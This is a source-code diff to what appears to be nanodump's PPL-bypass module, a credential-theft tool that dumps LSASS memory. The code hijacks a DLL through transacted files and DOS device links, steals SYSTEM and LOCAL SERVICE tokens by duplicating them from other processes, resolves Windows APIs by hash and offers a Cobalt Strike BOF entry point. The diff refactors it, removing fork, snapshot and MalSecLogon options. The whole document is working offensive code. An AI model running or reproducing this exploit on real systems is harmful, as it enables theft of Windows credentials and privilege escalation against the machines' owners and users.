@@ -14,6 +14,7 @@
 #include "../dinvoke.c"
 #include "../syscalls.c"
 #include "../token_priv.c"
+#include "../impersonate.c"
 #endif
 
 BOOL run_ppl_bypass_exploit(
@@ -21,11 +22,7 @@ BOOL run_ppl_bypass_exploit(
     IN unsigned int nanodump_dll_len,
     IN LPCSTR dump_path,
     IN BOOL use_valid_sig,
-    IN BOOL fork_lsass,
-    IN BOOL snapshot_lsass,
-    IN BOOL duplicate_handle,
-    IN BOOL use_malseclogon,
-    IN LPCSTR malseclogon_target_binary)
+    IN BOOL duplicate_handle)
 {
     BOOL bCurrentUserIsSystem = FALSE;
     HANDLE hSystemToken = NULL;
@@ -64,20 +61,20 @@ BOOL run_ppl_bypass_exploit(
     HANDLE hCurrentToken = NULL;
     HANDLE hNewProcessToken = NULL;
     HANDLE hNewProcess = NULL;
-    SECURITY_QUALITY_OF_SERVICE Qos;
-    OBJECT_ATTRIBUTES TokenObjectAttributes;
+    SECURITY_QUALITY_OF_SERVICE Qos = { 0 };
+    OBJECT_ATTRIBUTES TokenObjectAttributes = { 0 };
+    RevertToSelf_t RevertToSelf = NULL;
 
     if (!check_ppl_requirements())
         goto end;
 
-    RevertToSelf_t RevertToSelf;
     RevertToSelf = (RevertToSelf_t)(ULONG_PTR)get_function_address(
         get_library_address(ADVAPI32_DLL, TRUE),
         RevertToSelf_SW2_HASH,
         0);
     if (!RevertToSelf)
     {
-        DPRINT_ERR("Address of 'RevertToSelf' not found");
+        api_not_found("RevertToSelf");
         goto end;
     }
 
@@ -88,7 +85,7 @@ BOOL run_ppl_bypass_exploit(
         0);
     if (!InitializeSecurityDescriptor)
     {
-        DPRINT_ERR("Address of 'InitializeSecurityDescriptor' not found");
+        api_not_found("InitializeSecurityDescriptor");
         goto end;
     }
 
@@ -99,7 +96,7 @@ BOOL run_ppl_bypass_exploit(
         0);
     if (!SetSecurityDescriptorDacl)
     {
-        DPRINT_ERR("Address of 'SetSecurityDescriptorDacl' not found");
+        api_not_found("SetSecurityDescriptorDacl");
         goto end;
     }
 
@@ -110,7 +107,7 @@ BOOL run_ppl_bypass_exploit(
         0);
     if (!DefineDosDeviceW)
     {
-        DPRINT_ERR("Address of 'DefineDosDeviceW' not found");
+        api_not_found("DefineDosDeviceW");
         goto end;
     }
 
@@ -121,7 +118,7 @@ BOOL run_ppl_bypass_exploit(
         0);
     if (!SetKernelObjectSecurity)
     {
-        DPRINT_ERR("Address of 'SetKernelObjectSecurity' not found");
+        api_not_found("SetKernelObjectSecurity");
         goto end;
     }
 
@@ -438,14 +435,11 @@ BOOL run_ppl_bypass_exploit(
     success = prepare_ppl_command_line(
         dump_path,
         use_valid_sig,
-        fork_lsass,
-        snapshot_lsass,
         duplicate_handle,
-        use_malseclogon,
-        malseclogon_target_binary,
         &pwszCommandLine);
     if (!success)
         goto end;
+    DPRINT("command line: %ls", pwszCommandLine);
 
     if (bCurrentUserIsSystem)
     {
@@ -552,16 +546,16 @@ BOOL run_ppl_bypass_exploit(
     bReturnValue = TRUE;
 
 end:
-    if (bImpersonationActive)
+    if (bImpersonationActive && RevertToSelf)
         RevertToSelf(); // If impersonation was active, drop it first
     if (hNewProcessToken)
         NtClose(hNewProcessToken);
     if (pwszCommandLine)
-        LocalFree(pwszCommandLine);
+        intFree(pwszCommandLine);
     if (pwszDosDeviceName)
-        LocalFree(pwszDosDeviceName);
+        intFree(pwszDosDeviceName);
     if (pwszDosDeviceTargetPath)
-        LocalFree(pwszDosDeviceTargetPath);
+        intFree(pwszDosDeviceTargetPath);
     if (hDllLink)
         NtClose(hDllLink);
     if (pwszDllLinkName)
@@ -601,7 +595,7 @@ BOOL create_protected_process_as_user(
         0);
     if (!CreateProcessAsUserW)
     {
-        DPRINT_ERR("Address of 'CreateProcessAsUserW' not found");
+        api_not_found("CreateProcessAsUserW");
         return FALSE;
     }
 
@@ -635,14 +629,11 @@ BOOL create_protected_process_as_user(
 BOOL prepare_ppl_command_line(
     IN LPCSTR dump_path,
     IN BOOL use_valid_sig,
-    IN BOOL fork_lsass,
-    IN BOOL snapshot_lsass,
     IN BOOL duplicate_handle,
-    IN BOOL use_malseclogon,
-    IN LPCSTR malseclogon_target_binary,
     OUT LPWSTR* command_line)
 {
     WCHAR wszSystemDir[MAX_PATH] = { 0 };
+    WCHAR dump_path_w[MAX_PATH] = { 0 };
     size_t size = 32767;
     GetSystemDirectoryW_t GetSystemDirectoryW;
 
@@ -652,7 +643,7 @@ BOOL prepare_ppl_command_line(
         0);
     if (!GetSystemDirectoryW)
     {
-        DPRINT_ERR("Address of 'GetSystemDirectoryW' not found");
+        api_not_found("GetSystemDirectoryW");
         return FALSE;
     }
 
@@ -669,31 +660,15 @@ BOOL prepare_ppl_command_line(
     wcsncat(*command_line, L"\\", size);
     wcsncat(*command_line, PPL_BINARY, size);
     // dump path
-    wchar_t dump_path_w[MAX_PATH];
     mbstowcs(dump_path_w, dump_path, MAX_PATH);
     wcsncat(*command_line, L" -w ", size);
     wcsncat(*command_line, dump_path_w, size);
-    // --fork
-    if (fork_lsass)
-        wcsncat(*command_line, L" -f", size);
-    // --snapshot
-    if (snapshot_lsass)
-        wcsncat(*command_line, L" -s", size);
     // --valid
     if (use_valid_sig)
         wcsncat(*command_line, L" -v", size);
     // --dup
     if (duplicate_handle)
         wcsncat(*command_line, L" -d", size);
-    // --malseclogon
-    if (use_malseclogon)
-    {
-        wcsncat(*command_line, L" -m", size);
-        wchar_t malseclogon_target_binary_w[MAX_PATH];
-        mbstowcs(malseclogon_target_binary_w, malseclogon_target_binary, MAX_PATH);
-        wcsncat(*command_line, L" -b ", size);
-        wcsncat(*command_line, malseclogon_target_binary_w, size);
-    }
 
     return TRUE;
 }
@@ -720,7 +695,7 @@ BOOL find_file_for_transaction(
     FindFirstFileW_t FindFirstFileW;
     FindNextFileW_t FindNextFileW;
     FindClose_t FindClose;
-    OBJECT_ATTRIBUTES oa;
+    OBJECT_ATTRIBUTES oa = { 0 };
     IO_STATUS_BLOCK IoStatusBlock;
     BOOL success;
     DWORD error_code;
@@ -731,7 +706,7 @@ BOOL find_file_for_transaction(
         0);
     if (!ConvertStringSidToSidW)
     {
-        DPRINT_ERR("Address of 'ConvertStringSidToSidW' not found");
+        api_not_found("ConvertStringSidToSidW");
         return FALSE;
     }
 
@@ -741,7 +716,7 @@ BOOL find_file_for_transaction(
         0);
     if (!GetSecurityInfo)
     {
-        DPRINT_ERR("Address of 'GetSecurityInfo' not found");
+        api_not_found("GetSecurityInfo");
         return FALSE;
     }
 
@@ -751,7 +726,7 @@ BOOL find_file_for_transaction(
         0);
     if (!GetSystemDirectoryW)
     {
-        DPRINT_ERR("Address of 'GetSystemDirectoryW' not found");
+        api_not_found("GetSystemDirectoryW");
         return FALSE;
     }
 
@@ -761,7 +736,7 @@ BOOL find_file_for_transaction(
         0);
     if (!FindClose)
     {
-        DPRINT_ERR("Address of 'FindClose' not found");
+        api_not_found("FindClose");
         return FALSE;
     }
 
@@ -771,7 +746,7 @@ BOOL find_file_for_transaction(
         0);
     if (!FindFirstFileW)
     {
-        DPRINT_ERR("Address of 'FindFirstFileW' not found");
+        api_not_found("FindFirstFileW");
         return FALSE;
     }
 
@@ -781,7 +756,7 @@ BOOL find_file_for_transaction(
         0);
     if (!FindNextFileW)
     {
-        DPRINT_ERR("Address of 'FindNextFileW' not found");
+        api_not_found("FindNextFileW");
         return FALSE;
     }
 
@@ -802,7 +777,7 @@ BOOL find_file_for_transaction(
         wcsncat(wszFilePath, L"\\", MAX_PATH);
         wcsncat(wszFilePath, wfd.cFileName, MAX_PATH);
         name.Buffer  = wszFilePath;
-        name.Length  = wcsnlen(name.Buffer, MAX_PATH);;
+        name.Length  = (USHORT)wcsnlen(name.Buffer, MAX_PATH);;
         name.Length *= 2;
         name.MaximumLength = name.Length + 2;
         InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);
@@ -899,7 +874,7 @@ BOOL write_payload_dll_transacted(
         0);
     if (!CreateFileTransactedW)
     {
-        DPRINT_ERR("Address of 'CreateFileTransactedW' not found");
+        api_not_found("CreateFileTransactedW");
         goto end;
     }
 
@@ -1015,7 +990,7 @@ BOOL map_dll(
         goto end;
 
     sectionName.Buffer  = pwszSectionName;
-    sectionName.Length  = wcsnlen(sectionName.Buffer, MAX_PATH);;
+    sectionName.Length  = (USHORT)wcsnlen(sectionName.Buffer, MAX_PATH);;
     sectionName.Length *= 2;
     sectionName.MaximumLength = sectionName.Length + 2;
     InitializeObjectAttributes(&oa, &sectionName, OBJ_CASE_INSENSITIVE, NULL, NULL);
@@ -1052,43 +1027,25 @@ end:
 
 BOOL check_ppl_requirements(VOID)
 {
-    HANDLE hToken = NULL;
+    BOOL success = FALSE;
+
     LPCWSTR ppwszRequiredPrivileges[2] = {
         L"SeDebugPrivilege",
         L"SeImpersonatePrivilege"
     };
-    NTSTATUS status;
-    BOOL success;
 
-    // get a handle to our token
-    status = NtOpenProcessToken(
-        NtCurrentProcess(),
-        TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
-        &hToken);
-    if (!NT_SUCCESS(status))
-    {
-        syscall_failed("NtOpenProcessToken", status);
+    success = check_token_privileges(
+        NULL,
+        ppwszRequiredPrivileges,
+        ARRAY_SIZE(ppwszRequiredPrivileges),
+        TRUE);
+    if (!success)
         return FALSE;
-    }
 
-    for (int i = 0; i < ARRAY_SIZE(ppwszRequiredPrivileges); i++)
+    // Check windows version >= 6.3
+    if (!is_win_6_point_3_or_grater())
     {
-        // make sure we have all the privileges we need
-        success = check_token_privilege(hToken, ppwszRequiredPrivileges[i], TRUE);
-        if (!success)
-        {
-            NtClose(hToken); hToken = NULL;
-            PRINT_ERR("A privilege is missing: %ls", ppwszRequiredPrivileges[i]);
-            return FALSE;
-        }
-    }
-
-    NtClose(hToken); hToken = NULL;
-
-    // Check windows version >= 8.1
-    if (!is_win_8_point_1_or_grater())
-    {
-        DPRINT_ERR("The Windows version must be 8.1 or greater");
+        PRINT_ERR("The Windows version must be 6.3 or greater");
         return FALSE;
     }
 
@@ -1104,7 +1061,7 @@ BOOL get_hijackeable_dllname(
     *ppwszDllName = intAlloc(64 * sizeof(WCHAR));
     if (!*ppwszDllName)
     {
-        malloc_failed()
+        malloc_failed();
         return FALSE;
     }
 
@@ -1114,9 +1071,9 @@ BOOL get_hijackeable_dllname(
         return TRUE;
     }
 
-    if (is_win_8_point_1_or_grater())
+    if (is_win_6_point_3_or_grater())
     {
-        wcsncpy(*ppwszDllName, DLL_TO_HIJACK_WIN81, 64);
+        wcsncpy(*ppwszDllName, DLL_TO_HIJACK_WIN63, 64);
         return TRUE;
     }
 
@@ -1127,347 +1084,21 @@ BOOL get_hijackeable_dllname(
     return FALSE;
 }
 
-BOOL impersonate_user(
-    IN LPCWSTR pwszSid,
-    IN PHANDLE phToken,
-    IN LPCWSTR pwszPrivileges[],
-    IN DWORD dwPrivilegeCount)
-{
-    BOOL bReturnValue = FALSE;
-
-    HANDLE hCurrentProcessToken = NULL;
-    *phToken = NULL;
-    HANDLE hToken = NULL;
-    NTSTATUS status;
-    BOOL success;
-
-    status = NtOpenProcessToken(
-        NtCurrentProcess(),
-        MAXIMUM_ALLOWED,
-        &hCurrentProcessToken);
-    if (!NT_SUCCESS(status))
-    {
-        syscall_failed("NtOpenProcessToken", status);
-        goto end;
-    }
-
-    success = check_token_privilege(
-        hCurrentProcessToken,
-        L"SeDebugPrivilege",
-        TRUE);
-    if (!success)
-        goto end;
-
-    success = check_token_privilege(
-        hCurrentProcessToken,
-        L"SeImpersonatePrivilege",
-        TRUE);
-    if (!success)
-        goto end;
-
-    success = find_process_token_and_duplicate(
-        pwszSid,
-        pwszPrivileges,
-        dwPrivilegeCount,
-        &hToken);
-    if (!success)
-        goto end;
-
-    success = impersonate(hToken);
-    if (!success)
-        goto end;
-
-    *phToken = hToken;
-    bReturnValue = TRUE;
-
-end:
-    if (hCurrentProcessToken)
-        NtClose(hCurrentProcessToken);
-    if (!bReturnValue && hToken)
-        NtClose(hToken);
-
-    return bReturnValue;
-}
-
-BOOL impersonate(
-    IN HANDLE hToken)
-{
-    NTSTATUS status;
-
-    status = NtSetInformationThread(
-        NtCurrentThread(),
-        ThreadImpersonationToken,
-        &hToken,
-        sizeof(HANDLE));
-    if (!NT_SUCCESS(status))
-    {
-        syscall_failed("NtSetInformationThread", status);
-        return FALSE;
-    }
-
-    return TRUE;
-}
-
-BOOL find_process_token_and_duplicate(
-    IN LPCWSTR pwszTargetSid,
-    IN LPCWSTR pwszPrivileges[],
-    IN DWORD dwPrivilegeCount,
-    OUT PHANDLE phToken)
-{
-    BOOL bReturnValue = FALSE;
-
-    PSID pTargetSid = NULL;
-    PVOID pBuffer = NULL;
-    PSYSTEM_PROCESS_INFORMATION pProcInfo = NULL;
-    HANDLE hProcess = NULL, hToken = NULL, hTokenDup = NULL;
-    DWORD dwBufSize = 0x1000;
-    PSID pSidTmp = NULL;
-    LPWSTR pwszUsername = NULL;
-    NTSTATUS status;
-    ConvertStringSidToSidW_t ConvertStringSidToSidW;
-    CLIENT_ID uPid = { 0 };
-    OBJECT_ATTRIBUTES ObjectAttributes;
-    OBJECT_ATTRIBUTES TokenObjectAttributes;
-    SECURITY_QUALITY_OF_SERVICE Qos;
-    BOOL success;
-
-    ConvertStringSidToSidW = (ConvertStringSidToSidW_t)(ULONG_PTR)get_function_address(
-        get_library_address(ADVAPI32_DLL, TRUE),
-        ConvertStringSidToSidW_SW2_HASH,
-        0);
-    if (!ConvertStringSidToSidW)
-    {
-        DPRINT_ERR("Address of 'ConvertStringSidToSidW' not found");
-        goto end;
-    }
-
-    success = ConvertStringSidToSidW(pwszTargetSid, &pTargetSid);
-    if (!success)
-    {
-        function_failed("ConvertStringSidToSidW");
-        goto end;
-    }
-
-    // get information of all currently running processes
-    do
-    {
-        pBuffer = intAlloc(dwBufSize);
-        if (!pBuffer)
-        {
-            malloc_failed();
-            goto end;
-        }
-
-        status = NtQuerySystemInformation(
-            SystemProcessInformation,
-            pBuffer,
-            dwBufSize,
-            &dwBufSize);
-
-        if (NT_SUCCESS(status))
-            break;
-
-        intFree(pBuffer); pBuffer = NULL;
-    } while (status == STATUS_BUFFER_TOO_SMALL || status == STATUS_INFO_LENGTH_MISMATCH);
-
-    if (!NT_SUCCESS(status))
-    {
-        syscall_failed("NtQuerySystemInformation", status);
-        goto end;
-    }
-
-    pProcInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;
-
-    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
-    InitializeObjectAttributes(&TokenObjectAttributes, NULL, 0, NULL, NULL);
-    Qos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
-    Qos.ImpersonationLevel = SecurityImpersonation;
-    Qos.ContextTrackingMode = 0;
-    Qos.EffectiveOnly = FALSE;
-    TokenObjectAttributes.SecurityQualityOfService = &Qos;
-
-    while (TRUE)
-    {
-        uPid.UniqueProcess = pProcInfo->UniqueProcessId;
-
-        status = NtOpenProcess(
-            &hProcess,
-            PROCESS_QUERY_INFORMATION,
-            &ObjectAttributes,
-            &uPid);
-        if (NT_SUCCESS(status))
-        {
-            // open a handle to the token of the process
-            status = NtOpenProcessToken(
-                hProcess,
-                TOKEN_QUERY | TOKEN_DUPLICATE,
-                &hToken);
-
-            if (NT_SUCCESS(status))
-            {
-                status = NtDuplicateToken(
-                    hToken,
-                    MAXIMUM_ALLOWED,
-                    &TokenObjectAttributes,
-                    FALSE,
-                    TokenImpersonation,
-                    &hTokenDup);
-
-                if (NT_SUCCESS(status))
-                {
-                    success = token_get_sid(hTokenDup, &pSidTmp);
-                    if (success)
-                    {
-                        success = token_get_username(hTokenDup, &pwszUsername);
-                        if (success)
-                        {
-                            success = token_compare_sids(pSidTmp, pTargetSid);
-                            if (success)
-                            {
-                                DPRINT("Found a potential Process candidate: PID=%d - Image='%ls' - User='%ls'", (USHORT)(ULONG_PTR)pProcInfo->UniqueProcessId, pProcInfo->ImageName.Buffer, pwszUsername);
-
-                                BOOL bTokenIsNotRestricted = FALSE;
-                                success = token_is_not_restricted(hTokenDup, &bTokenIsNotRestricted);
-                                if (success)
-                                {
-                                    if (!bTokenIsNotRestricted)
-                                    {
-                                        DPRINT("This token is restricted.");
-                                    }
-                                    else
-                                    {
-                                        DPRINT("This token is not restricted.");
-
-                                        if (pwszPrivileges && dwPrivilegeCount != 0)
-                                        {
-                                            DWORD dwPrivilegeFound = 0;
-                                            for (DWORD i = 0; i < dwPrivilegeCount; i++)
-                                            {
-                                                if (check_token_privilege(hTokenDup, pwszPrivileges[i], FALSE))
-                                                    dwPrivilegeFound++;
-                                            }
-
-                                            if (dwPrivilegeFound == dwPrivilegeCount)
-                                            {
-                                                DPRINT("Found a valid Token.");
-                                                *phToken = hTokenDup;
-                                                bReturnValue = TRUE;
-                                            }
-                                        }
-                                        else
-                                        {
-                                            DPRINT("Found a valid Token.");
-                                            *phToken = hTokenDup;
-                                            bReturnValue = TRUE;
-                                        }
-                                        DPRINT("The token was not valid.");
-                                    }
-                                }
-                            }
-                            intFree(pwszUsername); pwszUsername = NULL;
-                        }
-                        LocalFree(pSidTmp); pSidTmp = NULL;
-                    }
-                    if (!bReturnValue)
-                    {
-                        NtClose(hTokenDup); hTokenDup = NULL;
-                    }
-                }
-                NtClose(hToken); hToken = NULL;
-            }
-            NtClose(hProcess); hProcess = NULL;
-        }
-        // If we found a valid token, stop
-        if (bReturnValue)
-            break;
-
-        // If next entry is null, stop
-        if (!pProcInfo->NextEntryOffset)
-            break;
-
-        // Increment SYSTEM_PROCESS_INFORMATION pointer
-        pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
-    }
-
-    if (!bReturnValue)
-    {
-        PRINT_ERR("No valid process token to impersonate was found.");
-    }
-
-end:
-    if (pTargetSid)
-        LocalFree(pTargetSid);
-    if (pBuffer)
-        intFree(pBuffer);
-
-    return bReturnValue;
-}
-
-BOOL impersonate_system(
-    OUT PHANDLE phSystemToken)
-{
-    BOOL success;
-    LPCWSTR pwszPrivileges[2] = {
-        L"SeDebugPrivilege",
-        L"SeAssignPrimaryTokenPrivilege"
-    };
-
-    success = impersonate_user(
-        L"S-1-5-18",
-        phSystemToken,
-        pwszPrivileges,
-        ARRAY_SIZE(pwszPrivileges));
-
-    if (!success)
-    {
-        PRINT_ERR("Could not impersonate SYSTEM");
-    }
-
-    return success;
-}
-
-BOOL impersonate_local_service(
-    OUT PHANDLE phLocalServiceToken)
-{
-    BOOL success;
-    
-    success = impersonate_user(
-        L"S-1-5-19",
-        phLocalServiceToken,
-        NULL,
-        0);
-
-    if (!success)
-    {
-        PRINT_ERR("Could not impersonate LOCAL SERVICE");
-    }
-
-    return success;
-}
-
 #ifdef BOF
 
 void go(char* args, int length)
 {
-    datap  parser;
-    BOOL   fork_lsass                = FALSE;
-    BOOL   snapshot_lsass            = FALSE;
-    BOOL   duplicate_handle          = FALSE;
-    LPCSTR dump_path                 = NULL;
-    BOOL   use_valid_sig             = FALSE;
-    BOOL   use_malseclogon           = FALSE;
-    LPCSTR malseclogon_target_binary = NULL;
+    datap          parser               = { 0 };
+    BOOL           duplicate_handle     = FALSE;
+    LPCSTR         dump_path            = NULL;
+    BOOL           use_valid_sig        = FALSE;
     unsigned char* nanodump_ppl_dll     = NULL;
     int            nanodump_ppl_dll_len = 0;
 
     BeaconDataParse(&parser, args, length);
     dump_path = BeaconDataExtract(&parser, NULL);
     use_valid_sig = (BOOL)BeaconDataInt(&parser);
-    fork_lsass = (BOOL)BeaconDataInt(&parser);
-    snapshot_lsass = (BOOL)BeaconDataInt(&parser);
     duplicate_handle = (BOOL)BeaconDataInt(&parser);
-    use_malseclogon = (BOOL)BeaconDataInt(&parser);
-    malseclogon_target_binary = BeaconDataExtract(&parser, NULL);
     nanodump_ppl_dll = (unsigned char*)BeaconDataExtract(&parser, &nanodump_ppl_dll_len);
 
     run_ppl_bypass_exploit(
@@ -1475,11 +1106,7 @@ void go(char* args, int length)
         nanodump_ppl_dll_len,
         dump_path,
         use_valid_sig,
-        fork_lsass,
-        snapshot_lsass,
-        duplicate_handle,
-        use_malseclogon,
-        malseclogon_target_binary);
+        duplicate_handle);
 }
 
 #endif
@@ -1488,26 +1115,25 @@ void go(char* args, int length)
 
 void usage(char* procname)
 {
-    PRINT("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--dup] [--help]", procname);
+    PRINT("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--duplicate] [--help]", procname);
+    PRINT("Dumpfile options:");
     PRINT("    --write DUMP_PATH, -w DUMP_PATH");
     PRINT("            filename of the dump");
     PRINT("    --valid, -v");
     PRINT("            create a dump with a valid signature");
-    PRINT("    --dup, -d");
+    PRINT("Obtain an LSASS handle via:");
+    PRINT("    --duplicate, -d");
     PRINT("            duplicate an existing " LSASS " handle");
+    PRINT("Help:");
     PRINT("    --help, -h");
     PRINT("            print this help message and leave");
 }
 
 int main(int argc, char* argv[])
 {
-    BOOL   fork_lsass                = FALSE;
-    BOOL   snapshot_lsass            = FALSE;
-    BOOL   duplicate_handle          = FALSE;
-    LPCSTR dump_path                 = NULL;
-    BOOL   use_valid_sig             = FALSE;
-    BOOL   use_malseclogon           = FALSE;
-    LPCSTR malseclogon_target_binary = NULL;
+    BOOL   duplicate_handle = FALSE;
+    LPCSTR dump_path        = NULL;
+    BOOL   use_valid_sig    = FALSE;
 
 #ifdef _M_IX86
     if(local_is_wow64())
@@ -1530,45 +1156,14 @@ int main(int argc, char* argv[])
             if (i + 1 >= argc)
             {
                 PRINT("missing --write value");
-                return -1;
+                return 0;
             }
             dump_path = argv[++i];
         }
-        else if (!strncmp(argv[i], "-f", 3) ||
-                 !strncmp(argv[i], "--fork", 7))
-        {
-            // TODO: make this work
-            PRINT("The parameter --fork is not allowed.");
-            return 0;
-            //fork_lsass = TRUE;
-        }
-        else if (!strncmp(argv[i], "-s", 3) ||
-                 !strncmp(argv[i], "--snapshot", 11))
-        {
-            // TODO: make this work
-            PRINT("The parameter --snapshot is not allowed.");
-            return 0;
-            //snapshot_lsass = TRUE;
-        }
         else if (!strncmp(argv[i], "-d", 3) ||
-                 !strncmp(argv[i], "--dup", 6))
+                 !strncmp(argv[i], "--duplicate", 12))
         {
             duplicate_handle = TRUE;
-        }
-        else if (!strncmp(argv[i], "-m", 3) ||
-                 !strncmp(argv[i], "--malseclogon", 14))
-        {
-            use_malseclogon = TRUE;
-        }
-        else if (!strncmp(argv[i], "-b", 3) ||
-                 !strncmp(argv[i], "--binary", 8))
-        {
-            if (i + 1 >= argc)
-            {
-                PRINT("missing --binary value");
-                return -1;
-            }
-            malseclogon_target_binary = argv[++i];
         }
         else if (!strncmp(argv[i], "-h", 3) ||
                  !strncmp(argv[i], "--help", 7))
@@ -1579,52 +1174,20 @@ int main(int argc, char* argv[])
         else
         {
             PRINT("invalid argument: %s", argv[i]);
-            return -1;
+            return 0;
         }
     }
 
     if (!dump_path)
     {
-        usage(argv[0]);
-        return -1;
+        PRINT("You need to provide the --write parameter");
+        return 0;
     }
 
     if (!is_full_path(dump_path))
     {
         PRINT("You need to provide the full path: %s", dump_path);
-        return -1;
-    }
-
-    if (fork_lsass && snapshot_lsass)
-    {
-        PRINT("The options --fork and --snapshot cannot be used at the same time");
-        return -1;
-    }
-
-    if (use_malseclogon && !duplicate_handle)
-    {
-        PRINT("In this mode, if MalSecLogon is being used, --dup must be provided.");
-        return -1;
-    }
-
-    if (use_malseclogon && !malseclogon_target_binary)
-    {
-        PRINT("In this mode, if MalSecLogon is being used, --binary must be provided.");
-        return -1;
-    }
-
-    if (malseclogon_target_binary &&
-        !is_full_path(malseclogon_target_binary))
-    {
-        PRINT("You need to provide the full path: %s", malseclogon_target_binary);
-        return -1;
-    }
-
-    if (malseclogon_target_binary &&
-        !file_exists(malseclogon_target_binary))
-    {
-        PRINT("The binary \"%s\" does not exists.", malseclogon_target_binary);
-        return -1;
+        return 0;
     }
 
     run_ppl_bypass_exploit(
@@ -1632,11 +1195,7 @@ int main(int argc, char* argv[])
         nanodump_ppl_dll_len,
         dump_path,
         use_valid_sig,
-        fork_lsass,
-        snapshot_lsass,
-        duplicate_handle,
-        use_malseclogon,
-        malseclogon_target_binary);
+        duplicate_handle);
 
     return 0;
 }
